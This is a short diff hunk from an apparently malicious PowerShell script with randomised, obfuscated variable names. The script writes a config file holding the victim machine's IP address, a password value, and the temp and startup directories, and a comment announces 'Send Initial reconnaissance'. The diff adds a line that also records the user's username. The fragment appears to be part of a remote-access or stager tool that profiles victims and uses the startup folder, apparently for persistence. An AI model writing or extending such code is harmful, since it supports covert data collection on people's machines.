@@ -45,6 +45,7 @@ $LcghRQwiJbdINVyFY = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGate
 # generate config file
 Add-Content -Path $rtsRfiZBxpGP -Value $LcghRQwiJbdINVyFY   #ip
 Add-Content -Path $rtsRfiZBxpGP -Value $OIRXhsDHFU          #pass
+Add-Content -Path $rtsRfiZBxpGP -Value $env:USERNAME        #username
 Add-Content -Path $rtsRfiZBxpGP -Value $env:temp            #temp dir
 Add-Content -Path $rtsRfiZBxpGP -Value $fXmtFxsAMdGw        #startup dir
 # Send Initial reconnaissance
